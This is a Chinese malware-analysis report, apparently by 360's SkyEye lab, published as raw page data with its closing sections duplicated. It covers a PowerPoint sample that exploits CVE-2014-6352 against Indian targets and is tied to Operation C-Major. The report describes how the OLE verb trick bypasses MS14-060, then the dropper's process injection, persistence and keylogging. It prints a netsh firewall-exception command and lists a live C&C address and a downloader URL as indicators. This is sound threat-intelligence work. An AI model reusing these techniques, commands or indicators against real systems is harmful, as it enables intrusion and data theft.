class="line" data-line="203">接收命令后，对命令做出相应的处理，在switch中根据命令执行对应的功能，这里就不再详细分析，下面给出部分功能与对应的命令，</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>rn</td>\n<td>下载/执行文件</td>\n</tr>\n<tr>\n<td>CAP</td>\n<td>屏幕监控</td>\n</tr>\n<tr>\n<td>un</td>\n<td>自删除、启动和终止进程</td>\n</tr>\n<tr>\n<td>up</td>\n<td>在线更新</td>\n</tr>\n<tr>\n<td>Ex</td>\n<td>加载插件</td>\n</tr>\n<tr>\n<td>GTV</td>\n<td>获取注册表HKEY_CURRENT_USER\\SoftWare\\ ce99f8fa1676b15364293a0db3d6a707中的键盘记录信息</td>\n</tr>\n<tr>\n<td>STV</td>\n<td>设置注册表HKEY_CURRENT_USER\\SoftWare\\ ce99f8fa1676b15364293a0db3d6a707开始键盘记录</td>\n</tr>\n<tr>\n<td>…..</td>\n<td>……</td>\n</tr>\n</tbody>\n</table>\n<h2 class="line" data-line="216">IOC</h2>\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>C&amp;C</td>\n<td>191.101.23.190:5552</td>\n</tr>\n<tr>\n<td>Downloader URL</td>\n<td>http://pcdopune.com/ad/video.ppsx</td>\n</tr>\n</tbody>\n</table>\n<h2 class="line" data-line="224">总结</h2>\n<p class="line" data-line="227">在网上公开的IOC平台中发现，该C&amp;C地址与趋势科技在今年三月份发布的“Operation C-Major”报告中的一个C&amp;C完全一致。另外，样本下载的域名pcdopune.com关联到的其他样本中，也出现了与报告中几乎一样的恶意宏样本，由此我们认为这是与C-Major相关的攻击行动。</p>\n<p class="line" data-line="229">根据360威胁情报中心的数据，我们发现本文所涉及的样本仅仅只是C-Major行动中使用的多种Dropper中的一种类型，CVE-2010-3333、CVE-2012-0158等漏洞也被利用来做恶意代码的植入，不仅如此，甚至还利用了宏和脚本，所使用的PE样本更是灵活多变。从这些迹象来看C-Major行动背后团伙非常积极地利用所能得到各种植入手段，极有可能是专业的有背景及一定技术能力的组织。</p>\n<h2 class="line" data-line="231">参考链接</h2>\n<p class="line" data-line="234"><a href="http://documents.trendmicro.com/assets/pdf/Indian-military-personnel-targeted-by-information-theft-campaign-cmajor.pdf"><em>http://documents.trendmicro.com/assets/pdf/Indian-military-personnel-targeted-by-information-theft-campaign-cmajor.pdf</em></a></p>\n<p class="line" data-line="236"><a href="http://www.cnblogs.com/Danny-Wei/p/4161539.html"><em>http://www.cnblogs.com/Danny-Wei/p/4161539.html</em></a></p>\n<p class="line" data-line="238"><a href="http://www.openoffice.org/sc/compdocfileformat.pdf"><em>http://www.openoffice.org/sc/compdocfileformat.pdf</em></a></p>\n',category:"专题报告",readableId:"CVE-2014-6352-and-targeted-attack-sample",publish_time:"2016-06-15T10:13:24.000Z",abstract:"近期360天眼实验室捕获到一例针对印度的定向攻击样本，样本利用了沙虫漏洞的补丁绕过漏洞CVE-2014-6352，经分析确认后我们认为这是趋势科技在今年三月份发布的名为“Operation C-Major”APT攻击活动的新样本。关于C-Major行动的相关内容，有兴趣的读者可以在文后的参考链接中查看。本文主要对CVE-2014-6352漏洞做基本的分析并剖析一个现实中利用此漏洞执行定向攻击的案例。",__v:0,author:"admin",modify_time:"2017-08-01T08:30:14.469Z",descImg:"/uploads/2017/08/01/847ba7154379f2cd5d13599b5f1023bf.png",insert_time:"2017-07-19T07:31:35.981Z",isDraft:!1,tags:["CVE-2014-6352"]}],pageTotal:2}]}],error:null,state:{pageId:[],tagParam:[],isMainPage:!0,pageNum:[1,2],articleData:{_id:"596f0ad74337d4596e59ed0b",title:"CVE-2014-6352漏洞及定向攻击样本分析",content:'<h2 class="line" data-line="0">引子</h2>\n<p class="line" data-line="3">人在做，天在看。</p>\n<p class="line" data-line="5">近期360天眼实验室捕获到一例针对印度的定向攻击样本，样本利用了沙虫漏洞的补丁绕过漏洞CVE-2014-6352，经分析确认后我们认为这是趋势科技在今年三月份发布的名为“Operation C-Major”APT攻击活动的新样本。关于C-Major行动的相关内容，有兴趣的读者可以在文后的参考链接中查看。</p>\n<p class="line" data-line="7">本文主要对CVE-2014-6352漏洞做基本的分析并剖析一个现实中利用此漏洞执行定向攻击的案例。</p>\n<h2 class="line" data-line="9">漏洞分析</h2>\n<p class="line" data-line="12">样本利用的漏洞为CVE-2014-6352，该漏洞是CVE-2014-4114的补丁绕过（MS14-060）问题,在管理员模式或者关闭UAC的情况下可以实现不弹出警告窗运行嵌入的恶意程序。与CVE-2014-4114的利用样本相比，CVE-2014-6352样本的特点是没有嵌入inf，只有一个嵌入PE的OLE对象。从攻击者的角度看，这类样本可以说有利有弊。在管理员模式下，可以无警告窗执行PE文件，绕开MS14-060的补丁。但是如果不是在管理员模式下，就算受害者没有安装MS14-060的补丁，也会弹窗提示是否要执行嵌入的EXE文件。</p>\n<p class="line" data-line="14">我们知道CVE-2014-4114漏洞的成因在于<code>packager.dll</code>的<code>CPackage::Load</code>方法加载对应的OLE复合文档对象时，对不同类型的复合文档有不同的处理流程，其中对某些复合文档嵌入的不可信来源文件没有经过处理，从而使得攻击者可以通过伪造OLE复合文档的CLSID来达到执行特定文件的效果：</p>\n<p class="text-center line" data-line="16"><img src="/uploads/2017/07/19/f897205ebdd4b539662fd55a38f8764c.png" alt="ec5689a025ca576871fd17473bcbc8c8" width="90%"></p>\n<p style="text-align:center; font-size:11px" class="line" data-line="18"><code>packager!Cpackage:: Load</code>方法中处理不同类型复合文档的分支</p>\n<p class="line" data-line="20">在MS14-060这个补丁中，微软通过添加MarkFileUnsafe函数来弥补这个漏洞：</p>\n<p class="text-center line" data-line="22"><img src="/uploads/2017/07/19/f8526ca329f4febc58d84379d2e857a3.png" alt="17ff0c4e99eedd776dc74c83cd72c86e" width="90%"></p>\n<p style="text-align:center; font-size:11px" class="line" data-line="25">ms14-060补丁中的<code>packager!Cpackage:: EmbedReadFromStream</code>方法</p>\n<p class="text-center line" data-line="27"><img src="/uploads/2017/07/19/500690b9394d10953d84afcfcccecf5c.png" alt="ee2bf9b4ccab377f39d334ff2b4dd703" width="90%"></p>\n<p style="text-align:center; font-size:11px" class="line" data-line="30">未安装ms14-060的<code>packager!Cpackage:: EmbedReadFromStream</code>方法</p>\n<p class="line" data-line="32"><code>MarkFileUnsafe()</code>通过调用<code>IZoneIdentifier::SetId</code>来设置文件的Security Zone，传入的参数3对应的是设置URLZONE_INTERNET，从而标明此文件来自于其他计算机，运行时会弹出警告窗口：</p>\n<p class="text-center line" data-line="34"><img src="/uploads/2017/07/19/8f9bade0d68af67a30677e2402f505b1.png" alt="de9349df8bd2c409db5fb768a4e43517" width="70%"></p>\n<p class="text-center line" data-line="36"><img src="/uploads/2017/07/19/f7ac3d0d95fc8757994bc71f1d7b1aa8.png" alt="3849abadc8fa5c51f32251ef06cdfb55" width="55%"></p>\n<p class="line" data-line="38">然而漏洞并不仅仅只是未对不可信来源的文件处理，攻击者还可以通过伪造OLE复合文档的CLSID和XML中的OLE Verb来改变执行流程。问题还在于对一个exe文件来说，即使被标记了URLZONE_INTERNET之后，右键点击以管理员权限运行时，将不会再弹窗提示该文件来自于其他计算机，而是以UAC的提示窗弹出：</p>\n<p class="text-center line" data-line="40"><img src="/uploads/2017/07/19/8e41d3b4d060bdc985a952f701f3338f.png" alt="88ced94789ce38c0e55e572dc208d252" width="60%"></p>\n<p class="line" data-line="42">所以只需要构造特定的CLSID和OLE Verb，使执行流程来到右键界面的第二项管理员权限运行EXE程序，那么在关闭UAC或者管理员权限的情况下，就能绕过MS14-060补丁施加的限制。下面我们结合这次从外面捕获到的样本来展示一下整个漏洞利用的过程。</p>\n<h2 class="line" data-line="44">样本分析</h2>\n<p class="line" data-line="47">首先我们拿到了一个名为vedio.ppsx的PPT文件，MD5为<strong>b6a1ee16de885c70682a7a8e4c1b556c</strong>，从VirusTotal的上传来源看为来自印度。对这个ppsx解压处理，可以看到其内嵌了一个OLE对象，嵌入的是一个PE文件：</p>\n<p class="text-center line" data-line="49"><img src="/uploads/2017/07/19/8530294cce4221c3b4b01073411f8feb.png" alt="da510314acac1a35878ca8c501550066" width="70%"></p>\n<p class="text-center line" data-line="51"><img src="/uploads/2017/07/19/71277408e68d7ff10d9133df8c53121b.png" alt="7a789920319ebd01a8111191b8436d07" width="70%"></p>\n<p class="line" data-line="54">在video.ppsx\\ppt\\slides\\slide1.xml中，指定了嵌入的对象<em>id = rId3</em></p>\n<p class="text-center line" data-line="56"><img src="/uploads/2017/07/19/0dad7c0e72148d4bcf5696155bd56afe.png" alt="dd45f53f870504f4cb90c4aeb3216967" width="90%"></p>\n<p class="line" data-line="59">在video.ppsx \\ppt\\slides\\_rels\\ slide1.xml.rels中指定了rId3对应的是前面提到的oleObject1.bin</p>\n<p class="text-center line" data-line="61"><img src="/uploads/2017/07/19/70bba37c63f251a821b6d85c0b99f089.png" alt="25e8be6c73bc79e942c20ca4ec47d751" width="90%"></p>\n<p class="line" data-line="64">复合文档对应的CLSID如下图，是{0003000c-0000-0000-c000-000000000046}，对应的是<code>CLSID\\_OldPackage</code>，那么根据上面的分析，<code>CPackage::Load</code>调用<code>CPackage::PackageReadFromStream</code>进一步处理，<code>PackageReadFromStream</code>会通过<code>CPackage::EmbedReadFromStream</code>在临时目录释放嵌入的PE文件。</p>\n<p class="text-center line" data-line="66"><img src="/uploads/2017/07/19/3b26fb904b5198daf95db220515432fc.png" alt="bd02c7199b8937e755285c7a94319bab" width="70%"></p>\n<p class="line" data-line="69"><code>packager!CPackage::EmbedReadFromStream</code>中调用了 <code>packager!CopyStreamToFile</code>这个函数，将嵌入的PE释放到temp目录下的putty.exe，并通过MarkFileUnsafe设置文件标记：</p>\n<p class="text-center line" data-line="71"><img src="/uploads/2017/07/19/4d8325c9f5d207023f8dc61d8b3d6084.png" alt="5aa0635ef7f3180fe1db46f7399917fc" width="70%"></p>\n<p class="line" data-line="74">然后，通过<code>CPackage::DoVerb</code>方法来响应终端用户的动作，在 <code>CPackage::DoVerb</code>中，会先对第二个参数进行判断，这个参数在video.ppsx\\ppt\\slides\\slide1.xml中指定：</p>\n<p class="text-center line" data-line="76"><img src="/uploads/2017/07/19/6185b2931696c6e14f0fcb33ed723bdc.png" alt="110e72f2b2d8cc8fb61b1b03d434272b" width="60%"></p>\n<p class="text-center line" data-line="78"><img src="/uploads/2017/07/19/974285891fde33c617e3bf0491c2c9e4.png" alt="84a19910d81ea7d7e44d3b4b02528135" width="50%"></p>\n<p class="line" data-line="80">样本中构造的参数是3，所以进入使用popup菜单命令执行操作的流程：</p>\n<p class="text-center line" data-line="82"><img src="/uploads/2017/07/19/53028b83a41a36a4db703f8136d7728c.png" alt="40cec50bbd6ae2f8051496495b28f10c" width="70%"></p>\n<p class="line" data-line="85">调用GetMenuItemInfo时，第二个参数uItem代表菜单的位置，这里参数为1，也就是右键菜单的第二项，对于exe文件，右键菜单的第二项是“以管理员权限运行”</p>\n<p class="text-center line" data-line="87"><img src="/uploads/2017/07/19/0839a8cf4c88abab33f22ceefcd087b9.png" alt="c63035508e86f51a92ba30eb4923487d" width="70%"></p>\n<p class="line" data-line="90">最终调用了<code>SHELL32!CDefFolderMenu::InvokeCommand</code>方法，这时就会以试图管理员权限运行putty.exe，在关闭了UAC或者管理员模式下，就绕过了MS14-060的保护静默地执行了一个PE文件。</p>\n<h2 class="line" data-line="92">所释放程序的分析</h2>\n<h3 class="line" data-line="95">putty.exe</h3>\n<p class="line" data-line="97">ppt文件释放出来的putty.exe实际上是一个改名后的经过混淆的.NET 程序，MD5为 <strong>78fab9978ae4de4f684908f47fdc2333</strong>，这个程序其实是一个Dropper。</p>\n<p class="line" data-line="99">经过去混淆后，我们可以清楚地看到其程序代码，首先遍历是否有杀软进程：</p>\n<p class="text-center line" data-line="101"><img src="/uploads/2017/07/19/b1424f26361cd612bea23097ac9ebdd5.png" alt="6288c40a99e15e50f60403cd645fdf7b" width="70%"></p>\n<p class="line" data-line="104">样本在这里其实不是一次遍历查找，而是分成多次遍历穿插在功能代码中，每次查找一到两款杀软的进程，查找的杀软进程如下：</p>\n<ul>\n<li>ekrn.exe（ESET）</li>\n<li>guardxkickoff.exe（IKARUS）</li>\n<li>AvastSvc.exe</li>\n<li>btagent.exe</li>\n<li>bdagent.exe（BitDefender）</li>\n<li>avgui.exe。</li>\n</ul>\n<p class="line" data-line="113">然后从资源中读取数据，并解密为一个PE文件</p>\n<p class="text-center line" data-line="115"><img src="/uploads/2017/07/19/8d14516bf5fda74c4fda4048d187393a.png" alt="fd4d12799d8a7d3ba57780053606e0e0" width="70%"></p>\n<p class="line" data-line="118">启动cmd进程，将自身拷贝成%temp%\\net\\health.exe并添加注册表启动项</p>\n<p class="text-center line" data-line="120"><img src="/uploads/2017/07/19/e2c5fbd89afc5af31fd936983addb09f.png" alt="d755d300218b7dddee8b99a2b22a18ca" width="90%"></p>\n<p class="text-center line" data-line="122"><img src="/uploads/2017/07/19/6406e44c2341468d55b1008d4a45c344.png" alt="25119ad65db1a5d422c56f97cf33fdbb" width="90%"></p>\n<p class="line" data-line="125"><strong>HKEY_CURRENT_USER/Software/Microsoft/Windows NT/CurrentVersion/Windows - load</strong> 这个值可以指定在用户登录后自动运行的程序文件名。</p>\n<p class="line" data-line="127">然后将RegAsm.exe拷贝为%temp%\\svhost.exe</p>\n<p class="text-center line" data-line="129"><img src="/uploads/2017/07/19/045a76172ad87b67fb6d983d27bca8aa.png" alt="ed46672de8d53ce473fa7954a269da27" width="40%"></p>\n<p class="text-center line" data-line="131"><img src="/uploads/2017/07/19/fa85671b4f2d25b42a835941e8b1b314.png" alt="9b6440545c9cbff8e32d59cf008fe4b7" width="90%"></p>\n<p class="text-center line" data-line="133"><img src="/uploads/2017/07/19/07c64ae2210d205282d9996758959d27.png" alt="1d3d631a1227c51f472b44367128ab08" width="60%"></p>\n<p class="line" data-line="135">接着以Suspend方式启动svhost.exe，将之前解密出来的PE注入，并恢复线程。</p>\n<p class="text-center line" data-line="137"><img src="/uploads/2017/07/19/ba0c7e440408f7d03148d03e952bfeab.png" alt="7f38dd2a4d4f4cdd659319f1af2c5e62" width="90%"></p>\n<p class="line" data-line="139">最后在%temp%/net/目录下写入health.exe.bat文件并执行</p>\n<p class="text-center line" data-line="141"><img src="/uploads/2017/07/19/5c48658f739e268d990f44b2b8c62f60.png" alt="835aae11f4e76320611b52eb98d3d1d2" width="80%"></p>\n<p class="line" data-line="143">health.exe.bat的代码如下，作用是不断遍历进程查看svhost.exe是否启动，没有启动的话则将其启动。</p>\n<p class="text-center line" data-line="145"><img src="/uploads/2017/07/19/26b6d8ff104be4f22a048131f4d481cd.png" alt="7da28826361240a37f148a685e5ab563" width="80%"></p>\n<h3 class="line" data-line="147">svhost.exe</h3>\n<p class="line" data-line="149">在HKEY_CURRENT_USER中设置一个值di用于判断是否已经感染过该系统：</p>\n<p class="text-center line" data-line="151"><img src="/uploads/2017/07/19/addb5d89a982f492bf7b89a19ad98a82.png" alt="c95ebff2497c18d2b3bb4b9710c9049d" width="70%"></p>\n<p class="line" data-line="153">设置HKEY_CURRENT_USER\\Environment\\SEE_MASK_NOZONECHECKS的值为1，这是用于关闭附件管理器检查的：</p>\n<p class="text-center line" data-line="155"><img src="/uploads/2017/07/19/5b53e06d0749114811dc105474a0b25b.png" alt="7ddf63a334a55426403ccf7796ed9ac4" width="90%"></p>\n<p class="line" data-line="157">然后用命令行启动netsh.exe，添加防火墙规则，允许其通过防火墙</p>\n<p class="text-center line" data-line="159"><img src="/uploads/2017/07/19/a24b4030f205e25bd7786d5c801195c7.png" alt="11cf4fcbdcc9843135ccf3501f432f78" width="70%"></p>\n<p class="line" data-line="161">命令行如下</p>\n<pre class="hljs"><code class="hljs">netsh firewall add allowedprogram "C:\\\\Users\\\\\\*\\*\\*\\\\AppData\\\\Local\\\\Temp\\\\svhost.exe" " svhost.exe" ENABLE\n</code></pre>\n<p class="line" data-line="166">申请一片内存空间用于存放接收/发送的数据，开始网络连接：</p>\n<p class="text-center line" data-line="168"><img src="/uploads/2017/07/19/9676a58a7a0286760d7efe01716f8b8d.png" alt="2b352c13dc65a30c5a89e3e58b7e5cd1" width="85%"></p>\n<p class="line" data-line="170">C&amp;C地址： 191.101.23.190</p>\n<p class="text-center line" data-line="172"><img src="/uploads/2017/07/19/7af893eca785ff862aee5afbac77b95b.png" alt="d0e210eb3f1849905b921d248fec11dd" width="45%"></p>\n<p class="line" data-line="174">端口号： 5552</p>\n<p class="text-center line" data-line="176"><img src="/uploads/2017/07/19/9bc5294feb1eba985a19966856852ebd.png" alt="3ee54e4519c9871e67dc2e902f0f5158" width="45%"></p>\n<p class="line" data-line="178">收集受害者的系统信息，包括上线时间、系统版本、系统位数、磁盘信息、当前用户等等，并发送出去：</p>\n<p class="text-center line" data-line="180"><img src="/uploads/2017/07/19/6d0d740ce86a5be474a38e095a07958b.png" alt="b34f35ad7c8977ff9ef8112311810416" width="90%"></p>\n<p class="line" data-line="182">然后开启一个线程循环查询socket是否可读（接收命令）：</p>\n<p class="text-center line" data-line="184"><img src="/uploads/2017/07/19/6f86f185399a40ecfcaafc97da288f3d.png" alt="64a74da6585d5361b5e420fd66de70a5" width="70%"></p>\n<p class="line" data-line="186">读取命令后，开启新线程根据指令执行对应的操作：</p>\n<p class="text-center line" data-line="188"><img src="/uploads/2017/07/19/425702e46d852ad1355b76207ab5f7fb.png" alt="6a52e6ba30f4ef0bce214db10ae90dae" width="90%"></p>\n<p class="line" data-line="190">开启键盘记录线程，并将记录信息保存在注册表HKEY_CURRENT_USER\\SoftWare\\ ce99f8fa1676b15364293a0db3d6a707中：</p>\n<p class="text-center line" data-line="192"><img src="/uploads/2017/07/19/b40472dad950a9b67f100bbfdace23fe.png" alt="a717d59135d644202bedebcc6412c553" width="90%"></p>\n<p class="text-center line" data-line="194"><img src="/uploads/2017/07/19/500e126afffb6afb4d141341145f9512.png" alt="80b41258aea92eb0ca1b83e446a900bf" width="90%"></p>\n<p class="line" data-line="196">设置自启动项：</p>\n<p class="text-center line" data-line="198"><img src="/uploads/2017/07/19/109deec3d382e38db502a2043da04b0c.png" alt="65ff19f29e11e13e3178dcf40a1416fb" width="90%"></p>\n<p class="text-center line" data-line="201"><img src="/uploads/2017/07/19/7fbf79d02308fa3ea4b0b3868cefcf89.png" alt="601e1a90b302e8c0c9989aafe7f95cb4" width="90%"></p>\n<p class="line" data-line="203">接收命令后，对命令做出相应的处理，在switch中根据命令执行对应的功能，这里就不再详细分析，下面给出部分功能与对应的命令，</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>rn</td>\n<td>下载/执行文件</td>\n</tr>\n<tr>\n<td>CAP</td>\n<td>屏幕监控</td>\n</tr>\n<tr>\n<td>un</td>\n<td>自删除、启动和终止进程</td>\n</tr>\n<tr>\n<td>up</td>\n<td>在线更新</td>\n</tr>\n<tr>\n<td>Ex</td>\n<td>加载插件</td>\n</tr>\n<tr>\n<td>GTV</td>\n<td>获取注册表HKEY_CURRENT_USER\\SoftWare\\ ce99f8fa1676b15364293a0db3d6a707中的键盘记录信息</td>\n</tr>\n<tr>\n<td>STV</td>\n<td>设置注册表HKEY_CURRENT_USER\\SoftWare\\ ce99f8fa1676b15364293a0db3d6a707开始键盘记录</td>\n</tr>\n<tr>\n<td>…..</td>\n<td>……</td>\n</tr>\n</tbody>\n</table>\n<h2 class="line" data-line="216">IOC</h2>\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>C&amp;C</td>\n<td>191.101.23.190:5552</td>\n</tr>\n<tr>\n<td>Downloader URL</td>\n<td>http://pcdopune.com/ad/video.ppsx</td>\n</tr>\n</tbody>\n</table>\n<h2 class="line" data-line="224">总结</h2>\n<p class="line" data-line="227">在网上公开的IOC平台中发现，该C&amp;C地址与趋势科技在今年三月份发布的“Operation C-Major”报告中的一个C&amp;C完全一致。另外，样本下载的域名pcdopune.com关联到的其他样本中，也出现了与报告中几乎一样的恶意宏样本，由此我们认为这是与C-Major相关的攻击行动。</p>\n<p class="line" data-line="229">根据360威胁情报中心的数据，我们发现本文所涉及的样本仅仅只是C-Major行动中使用的多种Dropper中的一种类型，CVE-2010-3333、CVE-2012-0158等漏洞也被利用来做恶意代码的植入，不仅如此，甚至还利用了宏和脚本，所使用的PE样本更是灵活多变。从这些迹象来看C-Major行动背后团伙非常积极地利用所能得到各种植入手段，极有可能是专业的有背景及一定技术能力的组织。</p>\n<h2 class="line" data-line="231">参考链接</h2>\n<p class="line" data-line="234"><a href="http://documents.trendmicro.com/assets/pdf/Indian-military-personnel-targeted-by-information-theft-campaign-cmajor.pdf"><em>http://documents.trendmicro.com/assets/pdf/Indian-military-personnel-targeted-by-information-theft-campaign-cmajor.pdf</em></a></p>\n<p class="line" data-line="236"><a href="http://www.cnblogs.com/Danny-Wei/p/4161539.html"><em>http://www.cnblogs.com/Danny-Wei/p/4161539.html</em></a></p>\n<p class="line" data-line="238"><a href="http://www.openoffice.org/sc/compdocfileformat.pdf"><em>http://www.openoffice.org/sc/compdocfileformat.pdf</em></a></p>\n',category:"专题报告",readableId:"CVE-2014-6352-and-targeted-attack-sample",publish_time:"2016-06-15T10:13:24.000Z",abstract:"近期360天眼实验室捕获到一例针对印度的定向攻击样本，样本利用了沙虫漏洞的补丁绕过漏洞CVE-2014-6352，经分析确认后我们认为这是趋势科技在今年三月份发布的名为“Operation C-Major”APT攻击活动的新样本。关于C-Major行动的相关内容，有兴趣的读者可以在文后的参考链接中查看。本文主要对CVE-2014-6352漏洞做基本的分析并剖析一个现实中利用此漏洞执行定向攻击的案例。",__v:0,author:"admin",modify_time:"2017-08-01T08:30:14.469Z",descImg:"/uploads/2017/08/01/847ba7154379f2cd5d13599b5f1023bf.png",insert_time:"2017-07-19T07:31:35.981Z",isDraft:!1,tags:["CVE-2014-6352"]}},serverRendered:!0}</script><script defer src="/_nuxt/manifest.863edfce59f0a00ce608.js"></script><script defer src="/_nuxt/vendor.bundle.21224f443c6ee9ce918d.js"></script><script defer src="/_nuxt/nuxt.bundle.b8b247420f15d35e36d4.js"></script>